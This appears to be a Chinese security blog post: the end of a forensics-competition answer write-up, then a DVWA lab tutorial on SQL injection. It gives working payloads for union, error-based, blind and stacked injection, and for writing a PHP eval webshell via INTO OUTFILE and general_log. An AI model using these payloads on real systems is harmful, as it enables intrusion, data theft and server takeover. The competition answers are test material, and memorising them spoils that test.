勾选项：\n创建的新建哈希集任务完成后，选择高级，在文件哈希处输入MD5，过滤范围选择子目录：\n成功找到目标文件：\n20231213_172032.tar/FileCompress(com.zs.filecompress).bak/FileCompress/11月.txt 综合题目 37.检材中受害人的微信号是多少? 检材二 -\u0026gt; 微信 -\u0026gt; 好友消息，根据聊天记录能判断出受害者就是小浩：\nB-I-N-A-R-Y 38.嫌疑人曾通过微信购买过一个公民信息数据库, 该数据库中手机尾号是 8686 的用户的姓名是 从另一个微信好友里面能发现购买数据库的名称为database.sqlite： 这个数据库手机看不了，在电脑里能看：\n链接数据库后查找：\nSELECT name FROM users WHERE phone LIKE \u0026#39;%8686\u0026#39;; 章敏 39.嫌疑人手机中是否保存了小西米语音 app 的账号密码, 如有, 请写出其密码 加密iOS备份 -\u0026gt; 钥匙串 -\u0026gt; 网站与应用密码，我们已经知道小西米的包名com.titashow.tangliao：\njamvU1@wiwgug$bo 40.公民信息数据库中, 截止到 2023 年 12 月 31 日, 年龄大于等于 18 且小于等于 30 岁之间的用户信息数量 在38题中得到的database数据库里进行查询：\nselect count(*) from users where (\u0026#39;20231231\u0026#39; - substr(IDCARD, 7, 8)) between 180000 and 300000; 得到结果：\n1572 41.受害人小浩的手机号码是多少 在上面的数据库中没有找到叫小浩的人，微信和短信也没有小浩的联系方式\n结果是之前找到的11月.txt是受害者名单，怎么发现的呢？\n案件 -\u0026gt; 快速分析 -\u0026gt; 耗时任务 -\u0026gt; 特征分析：\n分析任务完成后，在文件 -\u0026gt; 检材 -\u0026gt; 加密文件中找到TrueCrypt容器\n在检材1的20231212.E01/分区6/Users/rd/Documents下有一个新建文本文档.txt是加密容器，有88MB：\n之前备忘录发现的内容Vcpswd:edgewallet，在检材一edge密码中找到对应内容：\n从字面猜测这个密码应该就是vc加密的密码pR7)nZ5\u0026amp;yQ2-oR0\u0026lt;，而加密卷应该就是那个很大的txt文件\n挂载：\n发现里面存在9月和10月两个名单： 九月是未加密的txt文件，十月却不是txt文件，而是一个pk开头的压缩包，应该是和11月一样的加密方式\n压缩包密码藏在了FileCompress软件中，找出软件安装包（apk）：\nFileCompress(com.zs.filecompress).bak/apps/com.zs.filecompress/a 导出后，使用jadx逆向：\ncom下找到主函数，代码逻辑中得到密码1!8Da9Re5it2b3a.，解密10月和11月：\n小浩的手机号：\n13533333333 42.完整的受害人名单是几个人 上题得知，一共6人\n43.受害人转账的总金额是多少 检材二中有一次付款，加密备份中有两次付款，每次都是200，通过上下文语境能知道三次付款没有重叠\n600 ","date":"2025-07-09T21:17:30+08:00","image":"http://picture.928330.xyz/typora/t010423dafdaa0e3353.jpg","permalink":"https://blog.928330.xyz/p/%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AF2023%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/","title":"中科实数杯2023取证总结"},{"content":"SQL注入是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而得到相应的数据信息\n我们可以选择手工注入，也能够选择使用自动化工具sqlmap进行注入\n手工注入 #0 环境配置 使用靶机：DVWA mysql\n将DVWA的security级别设置为low，可以看到php源码中是一句简单的查询语句，没有进行任何过过滤\n当用户输入查询内容的时候，$id将会被替换成此内容：\n$query = \u0026#34;SELECT first_name, last_name FROM users WHERE user_id = \u0026#39;$id\u0026#39;; 比如，我们输入1，那么执行的语句就是\nSELECT first_name, last_name FROM users WHERE user_id = \u0026#39;1\u0026#39; 那如果我们输入1\u0026rsquo; and 1=1#:\nSELECT first_name, last_name FROM users WHERE user_id = \u0026#39;1\u0026#39; and 1=1# \u0026#39; 可以看到，前面的\u0026rsquo;\u0026lsquo;闭合了，后面的\u0026rsquo;被我们注释了，中间的and1=1会被正常执行\n那么我们完全可以在这里面插入自己想要执行的sql语句，这就是SQL注入！\n#1 union联合查询注入 虽然知道可以执行任意sql代码了，但是我们又不知道有哪些表，表里面有哪些元素，有什么用呢？\n所以，现在我们需要通过一系列的操作，来确定这些东西：\n1.判断是否存在注入，注入是字符型还是数字型\n2.猜测SQL查询语句中的字段数\n3.确定显示的字段顺序\n4.获取当前数据库\n5.获取数据库中的表\n6.获取表中的字段名\n7.显示字段信息\n那么，开始吧！\n常用函数 功能类别 函数/语句 主要数据库 功能描述 注入示例 系统信息查询 database() 或 schema() MySQL 获取当前数据库的名称 ' union select 1,database() # version() 或@@version 通用 获取数据库的详细版本号 ' union select 1,version() # user() 或 current_user() 通用 获取执行查询的数据库用户名 ' union select 1,user() # @@hostname MySQL, MSSQL 获取数据库服务器的主机名 ' union select 1,@@hostname # @@datadir MySQL 获取数据库文件的存储路径 ' union select 1,@@datadir # 数据查询与拼接 group_concat() MySQL, SQLite 纵向将多行结果合并成一个字符串一行显示，用于一次性列出所有表名/列名 ' union select 1,group_concat(table_name) from information_schema.tables # concat() 或 concat_ws() MySQL **横向将多个字符串或列连接成一个，但是不改变行数，**用于拼接用户名和密码等字段 ' union select 1,concat(username,':',password) from users # count() 通用 统计行数 ' union select 1,count(*) from users # substring() 或 limit 通用 截取字符串或按行返回。主要用于盲注，逐个字符或逐行猜解数据 ' and substring(database(),1,1)='a' # 1.判断注入是字符类型or数字型 为什么需要判断？因为数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合\n**数字型：**select * from table where id =$id，我们可以直接输入1 and ... 进行执行:\nselect * from table where id =1 and ... **字符型：**select * from table where id=\u0026rsquo;$id\u0026rsquo;我们需要输入1' and ... # ，闭合前后单引号\nselect * from table where id=\u0026#39;1\u0026#39; and ... #\u0026#39; 关于注释：\n\u0026ndash; 是官方的注释，后面必须跟空格\n# 是mysql特有的注释，后面无需跟空格\n如果直接在url中注入而非输入框，需要使用%23代替#，因为浏览器会把#后面内容截断，而非编码\n有的网站会过滤空格导致\u0026ndash;报错，这时候可以使用\u0026ndash;+，用+代替空格\n以上方法不一定全部适用，需要结合实际情况尝试\n基于这种思路，只要我们能够测试注入成功，使得页面不出现语法报错，那么就可以借此判断出类型：\n测试目的 测试Payload 预期结果 判断数字型 1 and 1=1 页面 正常，与 ?id=1 时相同 1 and 1=2 页面 内容异常 (如变空)，但不是程序或语法报错 判断字符型 1' and '1'='1 页面 正常，与 ?id='1' 时相同 1' and '1'='2 页面 内容异常 (如变空)，但不是程序或语法报错 分别测试是否对应的结果\n还有更加简单（但是不知道是否一定有效的方法）：\n输入2-1，如果是数字型，就会执行2-1运算，id=1；如果是字符型，就会是id=2\n可以构造一个m-n，m是不存在的id，但m-n结果是存在的id，依据结果来判断是字符型还是数字型\n这一点在盲注时比较方便\n通过以上测试，我们知道了现在DVWA的注入类型是字符型\n当然，在写题的时候很有可能你一个也试不出来，因为它是被('')或者\u0026quot;\u0026quot;包裹的，这就需要你凭感觉试了\n不过在此之前，先检查一下你之前的语句有没有写对吧~\n2.猜测SQL查询语句中的字段数（列数） 从1开始，使用order by语句指定查询结果依照第n列排序，如果报错，说明不存在该行列\n1\u0026#39; or 1=1 order by 1 # 1\u0026#39; or 1=1 order by 2 # 1\u0026#39; or 1=1 order by 3 # //报错了 order by 3的时候报错，说明当前查询的表中只有2列\nand：如果and前为真，执行后面内容\nor：如果前面为假，才执行后面内容\n3.确定显示的字段顺序 虽然我们知道了字段数，但很可能这些字段不是都显示在网页前端的\n假如其中某些字段的查询结果是会返回到前端的，那么我们就需要知道这些字段中哪些结果会回显，如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试\n这时候我们利用一个简单的语句：select 1,2,3，根据显示在页面上的数字就可以知道回显位置（sql特性）\n之后，我们只需要把这个数字改成我们想查询的内容（如id,password），就会在窗口显示我们想要的结果\n1\u0026#39; union select 1,2 # 这样就确定了网站执行的SQL语句为：\nselect Firstname,Surname from xx where ID=\u0026#39;id\u0026#39; 从过程中也不难看出，其实确定字段列数和显示顺序可以一起做 从union select 1开始，一直增加select后的位数，直到报错为止\n4.获取当前数据库 知道了回显位，我们就可以把回显位替换成想要的数据\n这里一定要写全，有多少字段，select后面就要有多少相应的字段：\n1\u0026#39; union select 1,database() # database() 是mysql内置函数，当数据库执行到它时，会将其替换为当前正在使用的数据库的名称\n于是，我们就知道了当前数据库名称为dvwa\n5.获取数据库中的表 information_schema.tables表存储了数据表的元数据信息：\n字段名 (Field Name) 描述 (Description) table_schema 记录该表所在的数据库的名称 table_name 记录数据表的名称 engine 记录该表使用的存储引擎，例如 InnoDB, MyISAM table_rows 关于表中总行数的一个粗略估计值 data_length 记录数据表本身的大小（单位：字节） index_length 记录数据表索引的大小（单位：字节） row_format 记录行的格式，例如 Dynamic 或 Compressed，可用于判断表是否被压缩 我们就可以从中得到想要的信息：\n1\u0026#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 上面的语句效果等同于下面的语句，只不过使用了group_concat()，让输出的内容拼成了一个字符串：\n1\u0026#39; union select 1,table_name from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; # 这样就知道了dvwa里面一共有两个表，分别为guestbook和users\n6.获取表中的字段名 information_schema.columns表存储了所有表所有列的元数据信息：\n字段名 描述 COLUMN_NAME 记录列的名称 TABLE_NAME 记录该列所属的数据表的名称 TABLE_SCHEMA 记录该列所属的数据库的名称 ORDINAL_POSITION 记录该列在表中的位置顺序（一个从1开始的数字） DATA_TYPE 记录该列的数据类型，例如 varchar, int, text 等 COLUMN_KEY 记录该列是否为键（索引）。PRI 代表主键, UNI 代表唯一键, MUL 代表可重复的索引 COLUMN_DEFAULT 记录该列的默认值（如果设置了） IS_NULLABLE 记录该列是否允许为 NULL 值 (YES 或 NO)。 CHARACTER_MAXIMUM_LENGTH 记录字符串类型列的最大长度。 同样借此获取users表的字段：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; and table_schema=database()# 这样就得到了users表的所有的列名称\n这里要注意的是，除了指定表名之外，还要指定数据库名，否则就会出现很多不属于这个表的列名：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; # 7.获取字段信息 知道了表名和列名，就能轻松获取对应信息了\n比如我想获取所有用户的id名称和对应密码：\n1\u0026#39; union select group_concat(user_id,first_name),group_concat(password) from users # 我们在这里使用group_concat拼接了两组字符串，因为select输出的数量必须与字段数一致，这里是2\n8.逐行获取信息 书接上文，如果我只想要显示某一条信息，就可以在末尾加上limit m,n\n意思是从第m条数据开始，显示包括n条数据，比如limit 0,1，就是只显示第1条数据（数据从0开始存储）\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 1,1 # 这里使用limit1,1，就只显示了第二条数据\n#2 报错注入 如果union被过滤，或者页面没有回显但SQL语句执行可以输出错误信息，就可以使用基于报错的注入攻击\n报错注入就是人为制造错误条件，让查询结果在报错信息中被“带出”\n报错注入最好使用and，因为我们的目的是保证语句执行错误，产生错误信息\n常用函数 在mysql高版本**（大于5.1版本）**中添加了对XML文档进行查询和修改的函数updatexml()和extractvalue()\n当这两个函数在执行时，如果出现xml文档路径错误就会产生报错\nextractvalue (XML_document, XPath_string) 第一个参数：XML_document 是目标XML文档\n第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容\n我们可以利用concat拼接任意非法字符和查询语句/函数，这样想要得到的内容就会随着报错一并回显：\n1\u0026#39; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))# 0x7e是~的十六进制，而~不属于xpath语法格式，因此会报出xpath语法错误：\nXPATH syntax error: \u0026#39;~dvwa~\u0026#39; 我们使用了database()函数，而sql会执行这个函数，返回函数结果，就带出了数据库名称\nupdatexml (XML_document, XPath_string, new_value) 第一个参数：XML_document 是目标XML文档 第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容 第三个参数：new_value 用来替换查找到的符合条件的数据 1\u0026#39; and updatexml(1,concat(0x7e,(select database()),0x7e),3)# 也是同理会报错\n之后的演示我会以updatexml()和extractvalue()为主\n但在此之前，我还想介绍一些其他的好玩的函数(当然也很有用!）👇\n不那么常用的函数 floor函数(8.x\u0026gt;mysql\u0026gt;5.0） floor()：对结果取整（向下舍入）\n这不是一个单独使用的函数，而是需要与rand(), count(*)和group by结合使用，来触发主键重复错误：\n(select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a) ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑ 这里插入你想进行的查询语句，只能有一个返回值，因为concat函数值只接受单值，最好使用limit语句，比如： (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 现在，我们输入这样的注入语句：\n1\u0026#39; and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)# 我们看看每一个部分的作用：\nfloor(rand(0)\\*2)\nrand()函数会产生一个0到1之间的随机数。但当给它一个固定的种子（seed），如0时，它产生的“随机数”序列就变成完全可预测的了\n最终，floor(rand(0)*2)会稳定地产生这样一个序列：0, 1, 1, 0, 1, 1, 0, ...\nconcat((select database()), floor(rand(0)\\*2))\n这部分将我们要查询的数据与上面产生的0或1拼接起来\n因此，它会生成一系列的字符串，如 'dvwa0', 'dvwa1', 'dvwa1', 'dvwa0'\n... from information_schema.tables group by x\nfrom information_schema.tables：这里只是为了提供足够的数据行（至少3行）来让group by操作得以触发错误，任何行数足够的表都可以。\ngroup by x：这是触发错误的关键，它会根据我们上面生成的字符串（如'dvwa0', 'dvwa1'）进行分组和计数。\nselect 1 from ...\n把返回两列的内部查询包装成只返回一列（内容是1）的、语法正确的子查询\n接下来，我们需要知道两个关键点：\n1.group by在执行时，会建立一个虚拟的临时表，用于存放分组的键(key)和count(*)计数值\n2.在执行插入操作前，sql会再次查询当前要插入的键，因此rand()会再次执行\n现在来看看错误是怎样发生的：\n逐行处理：\n第一行：调用rand()，计算出的键是'dvwa0'，临时表中没有这个键，sql准备插入，此时第二次调用rand()，计算出'dvwa1'插入\n（也就是说，想插入的是0，却插入了1）\n第二行：此时rand()第三次被调用，计算出的键是'dvwa1'，临时表中已经有了，不用插入，计数值加一就行\n（注意：sql这里一开始就没有打算插入，而是选择count+1）\n触发错误：\n第三行：此时rand()第四次被调用，计算出的键是'dvwa0'，表里没有这个键，所以sql准备插入，此时第五次调用rand()，计算出'dvwa1'插入\n等等，不对！表里已经有'dvwa1'了！\n这就导致sql尝试插入一个已经存在的键，从而触发了**“主键重复”（Duplicate entry）的错误：**\nDuplicate entry \u0026#39;dvwa1\u0026#39; for key \u0026#39;group_key\u0026#39; 这样，就把数据库名称带了出来\n同时，我们还能总结出这样的规律：\n对于一个整数x通过floor(rand(x)*2)产生的序列：\n如果在未出现0011或1100序列前出现0010或1101，那么该序列可用于报错型sql盲注\n参考文档：SQL报错型盲注教程 ​\t关于floor()报错注入，你真的懂了吗？ ST_LatFromGeoHash(geohash_string) 参数是一个GeoHash格式的字符串，如果格式不对，函数就会报错，并可能返回导致错误的非法字符串\n1\u0026#39; and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))# 和XPath_string一样，~不是GeoHash格式里面的合法字符，如果使用就会报错，同时带出数据：\nFUNCTION dvwa.ST_LatFromGeoHash does not exist ↑↑↑↑↑ ST_LongFromGeoHash(geohash_string) 利用原理与ST_LatFromGeoHash完全相同\nST_PointFromGeoHash(geohash_string, srid) 好吧和上面还是一样的\nGTID_SUBSET(subset, set) 第一个参数： subset一个GTID（全局事务标识符）集合。\n第二个参数： set另一个GTID集合。\n一个合法的GTID单元由两部分组成，用冒号隔开：source_id:transaction_id\n当任意一个参数不是合法的GTID集合格式时，函数就会报错，并可能返回非法参数的内容\n1\u0026#39; and GTID_SUBSET(database(), 1)# 报错结果：\nFUNCTION dvwa.GTID_SUBSET does not exist 好啦，函数介绍就到此为止，下面我们正式开始报错注入的步骤！\n爆破数据库名称 1\u0026#39; and extractvalue(1,concat(0x7e,database(),0x7e)) # 1\u0026#39; and updatexml(1,concat(0x7e,database(),0x7e),1) # 出现下面报错：\nXPATH syntax error: \u0026#39;~dvwa~\u0026#39; 这就得到了数据库的名称：dvwa\n可能你会有疑惑，为什么要用~包裹内容呢？\n这一方面是方便我们看返回的结果，另一方面嘛，我们接着往下看\n爆破表名 由于 extractvalue() 最大返回长度为 32 ，所以最好用 limit N,1 一行一行的进行回显\n1\u0026#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; limit 0,1),0x7e)) # 1\u0026#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; limit 1,1),0x7e)) # 分别出现下面报错：\nXPATH syntax error: \u0026#39;~guestbook~\u0026#39; XPATH syntax error: \u0026#39;~users~\u0026#39; 而如果不用limit语句，则会出现下面的报错：\nSubquery returns more than 1 row 这不是我们想要的，所以limit语句很重要！\n爆破列名 1\u0026#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 3,1),0x7e)) # 1\u0026#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 4,1),0x7e)) # 分别出现下面报错：\nXPATH syntax error: \u0026#39;~user~\u0026#39; XPATH syntax error: \u0026#39;~password~\u0026#39; 爆破字段内容 1\u0026#39; and extractvalue(1,concat(0x7e,(select concat_ws(\u0026#39;,\u0026#39;,user,password) from users limit 0,1),0x7e)) # 出现下面的报错：\nXPATH syntax error: \u0026#39;~admin,5f4dcc3b5aa765d61d8327deb\u0026#39; 这里我们使用了concat_ws函数，指定把user和password字段使用,拼接再返回，这样就能实现查询多列\n如果不使用，就会出现下面的报错：\nOperand should contain 1 column(s) 然而，正如上面所说，extractvalue() 函数最大返回32个字符，所以现在得到的并非完整的信息，这一点我们也能从结果末尾没有~看出来**（所以两边都加~是比较明智的选择）**\n所以，我们要适当舍弃一些东西，比如把admin单独拿出来，或者使用**substring()函数**\nsubstring(strings,m,n)：从strings的第m个字符开始，向后截取n个字符。 注意：1.substring()的开始位置为1，和limit不一样！ 2.通常substr()可以代替它，用法也相同；而mid()总是可以代替它，因为就是它的别名 substr()=substring()=mid()\n1\u0026#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(\u0026#39;,\u0026#39;,user,password), 1, 30) from users limit 0,1),0x7e)) # 1\u0026#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(\u0026#39;,\u0026#39;,user,password), 31, 30) from users limit 0,1),0x7e)) # 分别得到下面的报错：\nXPATH syntax error: \u0026#39;~admin,5f4dcc3b5aa765d61d8327de~\u0026#39; XPATH syntax error: \u0026#39;~b882cf99~\u0026#39; 拼接得到完整的用户名和密码：\nadmin,5f4dcc3b5aa765d61d8327deb882cf99 利用substring()，即使字段长度远远大于32，我们也能一点点凑出完整的内容\n#3 盲注 有的时候存在注入点，但是前端并不会回显注入结果，这就需要用特殊方式判断我们是否注入成功\n常用函数 函数 用法 mid/substr/substring(string, m, n) 从 m 位置截取string字符串 n 位，初始位置为1，n 可省略 length(string) 返回字符串长度 ord(string) 返回 string 最左面字符的 ASCII 码值 left(string, len) 从左截取 string 的前 len 位 ascii() 将某个字符转换为 ASCII 码值 if(exp1, exp2, exp3) 如果 exp1 正确，就执行 exp2 ，否则执行 exp3 sleep(time) 休眠多少秒 布尔盲注 当我们查询的数据在数据库存在时，就会返回：\nUser ID exists in the database 反之，则会返回：\nUser ID is MISSING from the database 我们可以构造一些判别式，观察页面返回值，来判断输入的语句是否为真\n猜测长度 使用与(and)：\n1\u0026#39; and length(database())=4 # 使用或(or)：\n\u0026#39; or length(database())=4 # 页面返回exists，说明数据库名称长度为4\n如果库名实在长，也可以使用二分法：\n1\u0026#39; and length(database())\u0026gt;4 # 猜测库名 1\u0026#39; and substring(database(),1,1)=\u0026#39;d\u0026#39; # 如果不想使用''包裹字母，也可以转换成ascii码：\n1\u0026#39; and ascii(substr(database(),1,1))=100 # 一步步尝试，直到尝试出完整的数据库名称\n当然，我们在知道ascii码表的情况下，使用二分法更快：\n1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;64 # 如果substring被过滤了：reverse+left代替substring ​\ttrim代替substring 附上一张ascii码表：\n猜测表的数量 1\u0026#39; and (select count(table_name) from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39;)=2 # 猜测表2的长度 1\u0026#39; and length((select table_name from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; limit 1,1))=5# 或者把length放在select后面：\n1\u0026#39; and (select length(table_name) from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; limit 1,1)=5# 猜测表名，字段名等等的步骤都大同小异，在此不过多赘述\n时间盲注 如果页面连exists这样的返回字样都没有怎么办？\n那么，我们就要寻找新的特征，来指示我们语句成功执行了——那就是时间\nsleep延时 利用if函数和sleep函数，如果语句成功执行，就让页面延时一段时间：\n1\u0026#39; and if(length(database())=4,sleep(5),1)# 注意此处if函数有三个参数，最后一个失败执行的语句exp3不能为空，要填上1补空\n如果不用if，也是可以的：\n1\u0026#39; and sleep((ascii(substring(database(),1,1))=100)*5)# 页面休眠了五秒，说明语句执行成功（sleep()返回了1,1*5=5），数据库名称长为4\n如果if函数被过滤了：[case when语句代替if](#case when语句代替if)\nbenchmark延时 benchmark(count, exp)：将表达式exp重复执行count次\n只要我们让执行次数够多，就能达到和sleep一样的延迟效果：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100,benchmark(5000000,md5(\u0026#39;a\u0026#39;)),1)# 如果数据库第一个字符是d，就让数据库计算五百万次a的md5值，这个过程近似五秒\n笛卡尔积延时 当查询发生在多个表中，并且没有任何限制条件时，会将多个表已笛卡尔积的形式联合起来：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 1)# 这个查询将information_schema.columns这张表自身进行了两次连接，查询起来很费时（大概要两三秒）\n如果感觉延时不够明显，可以多加几次自连接\n正则匹配延时 通过构造正则表达式，让数据库的正则引擎在进行匹配时陷入大量的回溯计算，从而消耗极长的CPU时间：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100, (select rpad(\u0026#39;a\u0026#39;,9999999,\u0026#39;a\u0026#39;) RLIKE concat(repeat(\u0026#39;(a.*)+\u0026#39;,30),\u0026#39;b\u0026#39;)), 1)# 我们来看看其中的正则延时部分是怎么工作的：\nselect rpad(\u0026#39;a\u0026#39;,4999999,\u0026#39;a\u0026#39;) RLIKE concat(repeat(\u0026#39;(a.*)+\u0026#39;,30),\u0026#39;b\u0026#39;) rpad(str,len,padstr)：用字符串padstr对str进行右边填补，直至它的长度达到len，然后返回 str\n​\t如果str的长度长于len，那么它将被截除到len个字符\n(a.*)+：内部的 .* 和外部的 + 都是贪婪量词，当正则引擎用这个模式去匹配一个长字符串时，存在指数级的可能性来划分字符串（例如，(a)(a)(a)、(aa)(a)、(a)(aa)等），引擎需要尝试所有这些路径\nb: 在模式末尾加上一个源字符串中不存在的字符'b'，是为了确保正则表达式的匹配最终一定会失败。这会迫使正则引擎耗尽所有可能的回溯路径，从而将延迟时间最大化\nrepeat(str,times)：字符串str复制times次\n*我在dvwa上使用上述的正则匹配方式无法得到延时结果，如果您知道为什么请留言\u0026gt;\u0026lt;\n参考文章：MySQL时间盲注五种延时方法 时间盲注其余的操作顺序和布尔盲注相同，只是换了一种方式实现判断\n报错盲注 报错盲注的思想和时间盲注相同，都是利用if函数\n不同点在于，报错盲注不依赖页面是否延时判断，而是依赖页面是否报错判断\nsql中存在很多数学计算函数，我们也主要利用他们来实现报错\nexp() exp(x)返回e的x次方，也就是e^x^\n当传递给exp()的参数过大（在MySQL中约大于709）时，会产生数值越界错误\n我们可以通过位运算符~运算0获得一个巨大的整数：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100,exp(~0),1)# 我们知道，~0的结果是64位无符号整数的最大值，远大于709，因此exp()函数执行时必定会溢出报错：\nDOUBLE value is out of range in \u0026#39;exp(~(0))\u0026#39; 你也可以选择手动输入一个很大的数字，比如exp(99999)\n同样的，我们也可以不用if函数，只要利用判断的返回值做运算即可：\n1\u0026#39; and exp((ascii(substring(database(),1,1))=100)*99999)# 如果ascii(substring(database(),1,1))=100为真，那么运算式为exp(1*99999)，也就是exp(99999)，就会报错\ncot() cot()是余切三角函数，而众所周知，cot(0)是不存在的：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100,cot(0),1)# 也可以不用if函数：\n1\u0026#39; and cot((ascii(substring(database(),1,1))=100)=0)# 如果ascii(substring(database(),1,1))=100为真，那么运算式为cot(1=0)，也就是cot(0)，就会报错\npow() pow(a,b)函数用于求a^b^的值，相信你已经知道怎么做了：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100,pow(99999,99999),1)# 不使用if函数：\n1\u0026#39; and pow((ascii(substring(database(),1,1))=100)+1,99999)# 如果ascii(substring(database(),1,1))=100为真，那么运算式就是pow(1+1,99999),也就是2^99999^，就会报错\n#4 堆叠注入 有些应用服务执行sql使用的不是mysqli_query(),而是mysqli_multi_query()方法，可以做到执行多条sql语句\n普通多语句注入 如果又恰好没有过滤;，我们就能使用;分割语句，利用sql语句进行各种操作：\n1\u0026#39; union select 1,2;update users set password=123 where id=1--+ 这样就篡改了密码\n但能使用堆叠注入的场景一般都对语句做了过滤，尤其是select这样的核心查询语句，我们需要用别的来代替\nshow查询 查询数据库名称 show databases; 查询数据库中的所有表 show tables from 数据库名; 查看表的字段 show columns from 表名; 或者：\ndescribe 表名; 或者：\ndesc 表名; 查看创建表的语句 show create table 表名; handler查询 handler是mysql特有的语句，他可以通过句柄来访问表\n句柄相当于一个指针\n打开句柄 handler 表名 open; 查看第一行数据 handler 表名 read first; 查看下一行数据 handler 表名 read next; 如果不适用first，直接使用next，效果等同于first\n查看某一行数据 handler 表名 READ 字段名 KEY (字段值); 关闭句柄 handler 表名 close; #5 文件读写注入 前提 mysql数据库中的secure_file_priv参数指定了数据库导入和导出的安全路径\n该参数可以有三种类型：\nsecure_file_priv=NULL：禁止导入和导出\nsecure_file_priv=/：只能在/目录下导入和导出\nsecure_file_priv=\u0026quot;\u0026quot; ：不做限制\n打开mysql.ini文件，在[mysqld]下修改（如果找不到就添加进去，一般都有）如下：\nsecure_file_priv = \u0026#34;\u0026#34; 重启服务，在命令行登录mysql数据库（找mysql.exe,我的路径是phpStudy\\PHPTutorial\\MySQL\\bin）：\nmysql -u root -p 如果不知道密码，就在mysql.ini中添加skip-grant-tables，跟上面命令放在一起就行，意思是不需要登录密码\n登录后搜索该参数：\nshow variables like \u0026#39;%priv%\u0026#39; 显示secure_file_priv对应value值为空，说明不做限制了\n文件读取 利用load_file函数能做到对服务器文件的读取：\nselect load_file(\u0026#34;D:\\\\1.txt\u0026#34;); 配合注入语句，我们可以做到读取任意文件（当然前提是页面会有输出）：\n1\u0026#39; union select 1,load_file(\u0026#39;D:/WWW/1.txt\u0026#39;) # 注意：\n这里使用的是/，因为\\是转义字符，而/在字符串里面没有任何含义\n也可以使用\\\\，给\\转义，让它被当做普通字符处理\n普通文件写入 利用into outfile可以实现任意内容写入指定位置的文件：\nselect \u0026#34;\u0026lt;? evilcode ?\u0026gt;\u0026#34; into outfile \u0026#34;D:\\\\1.txt\u0026#34;; 也可以使用into dumpfile，区别是它只生成一行数据，不会对数据做任何处理（换行等）：\nselect \u0026#34;\u0026lt;? evilcode ?\u0026gt;\u0026#34; into dumpfile \u0026#34;D:\\\\1.txt\u0026#34;; 利用这一点，我们可以向服务器上传一句话木马\nunion select 最常用的写入方式，在select内容中插入一句话木马\n1\u0026#39; union select 1,\u0026#39;\u0026lt;?php eval($_POST[kaka]); ?\u0026gt;\u0026#39; into outfile \u0026#39;D:/WWW/114514.php\u0026#39; # 虽然报错，但是文件也写入成功了：\n接着就可以使用蚁剑等工具接管网站\nlines terminated by lines terminated by用来定义导出的文件中每行数据以什么字符结尾（默认是换行符 \\n）：\n1\u0026#39; into outfile \u0026#39;D:/WWW/114514.php\u0026#39; lines terminated by \u0026#39;\u0026lt;?php eval($_POST[kaka]); ?\u0026gt;\u0026#39; # lins starting by 与上一种相反，它控制的是每一行开始位置的内容：\n1\u0026#39; into outfile \u0026#39;D:/WWW/114514.php\u0026#39; lines starting by \u0026#39;\u0026lt;?php eval($_POST[kaka]); ?\u0026gt;\u0026#39; # fields terminated by fields terminated by控制的是一行数据中，各个字段（列）之间的分隔符：\n1\u0026#39; into outfile \u0026#39;D:/WWW/114514.php\u0026#39; fields terminated by \u0026#39;\u0026lt;?php eval($_POST[kaka]); ?\u0026gt;\u0026#39; # columns terminated by 是上一种的同义词，作用完全一样：\n1\u0026#39; into outfile \u0026#39;D:/WWW/114514.php\u0026#39; columns terminated by \u0026#39;\u0026lt;?php eval($_POST[kaka]); ?\u0026gt;\u0026#39; # 日志文件写入 如果mysql无法更改导出文件路径，或者根本不允许导出路径，我们还可以通过日志文件注入\n写入的前提是要开启general log或者slow_query_log模式，并设置目录地址\n下面用general log做演示\n查看配置：\nshow variables like \u0026#39;%general%\u0026#39; 开启general log模式：\nset global general_log = on; 设置目录地址：\nset global general_log_file = \u0026#39;D:/WWW/114514.php\u0026#39;; 接下来就可以写入一句话木马：\nselect \u0026#39;\u0026lt;?php eval($_POST[kaka]); ?\u0026gt;\u0026#39; 我们输入的木马会被设定的log文件记录，这时候就能用蚁剑连接网站\n#6 DNSlog注入 